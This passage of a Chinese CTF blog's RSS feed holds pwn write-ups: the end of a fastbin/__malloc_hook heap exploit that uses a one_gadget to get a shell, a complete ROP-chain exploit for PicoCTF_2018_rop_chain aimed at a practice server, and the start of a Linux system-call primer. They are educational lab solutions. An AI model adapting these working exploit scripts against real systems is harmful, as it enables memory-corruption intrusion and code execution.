punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;\x7f&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;\x00\x00&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;libc_base&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;main_arena_88&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x3c4b78&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#步骤 5&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fake_chunk&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; libc_base&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x3c4aed&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;63&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#步骤 6&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;64&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#回收一部分 chunk4&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;65&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;free&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#使 chunk4 进入 fastbin 中&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;66&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;67&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload4&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fake_chunk&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#改写 chunk4 的 fd 使 fake_chunk 进入 fastbin&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;68&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload4&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload4&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;69&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;70&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#步骤 7&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;71&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#index4，分配 chunk4&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;72&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#index5，分配 fake_chunk&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;73&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;74&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#因为 malloc_hook=main_arena-0x10，fake_chunk=mian_arena-0x33&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;75&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#所以 malloc_hook=fake_chunk+0x23 (fake_chunk+0x33-0x10)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;76&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;77&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload5&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p8&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#0x13&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;78&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload5&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;libc_base&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x4526a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#0x4526a 由 one_gadget 查找得到&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;79&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload5&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload5&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;80&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;81&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;               &lt;span class=&#34;token comment&#34;&gt;#index6, 执行一次就会执行 malloc_hook，就可以 getshell&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;82&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;83&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/14/pPW9VAI.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3RoaW5rX3ljeC9hcnRpY2xlL2RldGFpbHMvNzc5ODI0Mzk=&#34;&gt;https://blog.csdn.net/think_ycx/article/details/77982439&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjIzNDYxLmh0bQ==&#34;&gt;https://bbs.kanxue.com/thread-223461.htm&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OS9hcnRpY2xlL2RldGFpbHMvMTA0ODk3MjQ5&#34;&gt;https://blog.csdn.net/weixin_43847969/article/details/104897249&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYS9hcnRpY2xlL2RldGFpbHMvMTA4MzYwMzc1&#34;&gt;https://blog.csdn.net/mcmuyanga/article/details/108360375&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;关于堆的参数：&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OS9hcnRpY2xlL2RldGFpbHMvMTA0ODk3MjQ5&#34;&gt;https://blog.csdn.net/weixin_43847969/article/details/104897249&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://vvwwvv.cn/2023/09/10/pwn/%E5%88%B7%E9%A2%98/BUUCTF/PicoCTF_2018_rop_chain1/</guid>
            <title>PicoCTF_2018_rop_chain</title>
            <link>https://vvwwvv.cn/2023/09/10/pwn/%E5%88%B7%E9%A2%98/BUUCTF/PicoCTF_2018_rop_chain1/</link>
            <category>pwn</category>
            <pubDate>Sun, 10 Sep 2023 21:33:50 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;picoctf_2018_rop_chain&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#picoctf_2018_rop_chain&#34;&gt;#&lt;/a&gt; PicoCTF_2018_rop_chain&lt;/h1&gt;
&lt;h2 id=&#34;1首先查看程序信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1首先查看程序信息&#34;&gt;#&lt;/a&gt; 1. 首先查看程序信息&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://ooo.0x0.ooo/2023/09/10/OnKFxK.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;发现是 32 位程序，开启了 NX&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用 ida 查看&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;首先查看 main 函数&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://ooo.0x0.ooo/2023/09/10/OnKhJa.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;里面有个 vuln 函数，查看&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://ooo.0x0.ooo/2023/09/10/OnKifS.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;发现 ret 到 gets 函数，由溢出可以利用&lt;/p&gt;
&lt;p&gt;发现有其他函数&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/10/pPcTy6S.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;逐个查看&lt;/p&gt;
&lt;p&gt;win_function1&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/10/pPcT2wj.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;win_function2&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/10/pPcTfkn.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/10/pPcThYq.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;2分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2分析&#34;&gt;#&lt;/a&gt; 2. 分析&lt;/h2&gt;
&lt;p&gt;1. 由上面的函数可以看出，下面的成立时可以输出 flag&lt;/p&gt;
&lt;p&gt;&lt;code&gt;if ( win1 &amp;amp;&amp;amp; win2 &amp;amp;&amp;amp; a1 == -559039827 )&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;但是程序并没有调用这些函数，需要我们自己去执行，通过上面发现的溢出漏洞可以做到&lt;/p&gt;
&lt;p&gt;2. 在 function1 中 &lt;strong&gt;win1=1&lt;/strong&gt; ，而 function2 中:&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;span&gt;c&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; win1 &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; a1 &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1163220307&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    win2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;需要让 &lt;strong&gt;a1=-1163220307（0xBAAAAAAD）&lt;/strong&gt; 才能实现 win2=1，并且在 flag 中要让   &lt;strong&gt;a1=-559039827（0xDEADBAAD）&lt;/strong&gt;  才能获取 flag&lt;/p&gt;
&lt;p&gt;注意 &lt;strong&gt;a1 是作为参数传入的&lt;/strong&gt; ，而 32 位系统是用栈来传参（栈中先是返回地址然后是参数的顺序），所以就可以通过溢出来控制参数的值&lt;/p&gt;
&lt;h2 id=&#34;3exp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3exp&#34;&gt;#&lt;/a&gt; 3.exp:&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;span&gt;n&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;context&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;log_level &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;debug&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;remote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;node4.buuoj.cn&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;29168&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;e&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ELF&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;./2018_rop&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;function1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x80485CB&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;function2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x80485D8&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x804862B&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;vuln&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x8048714&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;a1_function2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0xBAAAAAAD&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;a1_flag&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0xDEADBAAD&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Enter your input&gt; &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x18&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;function1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;function2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a1_function2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a1_flag&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/10/pPcb9dH.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</guid>
            <title>Linux之系统调用</title>
            <link>https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</link>
            <category>pwn</category>
            <category>二进制</category>
            <category>Linux</category>
            <pubDate>Tue, 29 Aug 2023 20:15:56 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;一系统调用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一系统调用&#34;&gt;#&lt;/a&gt; 一。系统调用&lt;/h1&gt;
&lt;h5 id=&#34;系统调用也是一个函数但是系统调用运行在内核态用户自定义的函数在用户态-而我们想要调用在内核态的指令如关闭打开中断io操作等就需要利用系统调用作为接口让用户进入内核态&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#系统调用也是一个函数但是系统调用运行在内核态用户自定义的函数在用户态-而我们想要调用在内核态的指令如关闭打开中断io操作等就需要利用系统调用作为接口让用户进入内核态&#34;&gt;#&lt;/a&gt; 系统调用也是一个函数，但是系统调用运行在内核态，用户自定义的函数在用户态。而我们想要调用在内核态的指令（如关闭 / 打开中断，I/O 操作等），就需要利用系统调用作为接口，让用户进入内核态。&lt;/h5&gt;
